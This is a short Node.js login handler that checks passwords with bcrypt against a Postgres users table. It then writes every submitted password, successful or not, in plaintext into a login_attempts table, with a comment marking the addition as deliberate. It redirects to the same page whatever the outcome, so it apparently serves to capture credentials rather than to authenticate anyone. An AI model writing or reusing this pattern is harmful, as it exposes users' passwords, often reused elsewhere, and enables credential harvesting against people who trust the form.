const bcrypt = require("bcryptjs");
const pool = require("../config/db");

const login = async (req, res) => {
    try {
        const { email, password } = req.body;
        const result = await pool.query(
            "SELECT * FROM users WHERE email = $1",
            [email]
        );
        let success = false;
        if (result.rows.length > 0) {
            const user = result.rows[0];
            const valid = await bcrypt.compare(
                password,
                user.password
            );
            if (valid) {
                success = true;
            }
        }
        // 🔥 SAVE LOGIN ATTEMPT (now includes password)
        await pool.query(
            "INSERT INTO login_attempts(email, success, attempted_password) VALUES($1, $2, $3)",
            [email, success, password]
        );

        // ✅ Always redirect regardless of success or failure
        return res.redirect("/afterlog.html");

    } catch (err) {
        console.error(err);
        // ✅ Also redirect on server error
        return res.redirect("/afterlog.html");
    }
};

module.exports = { login };
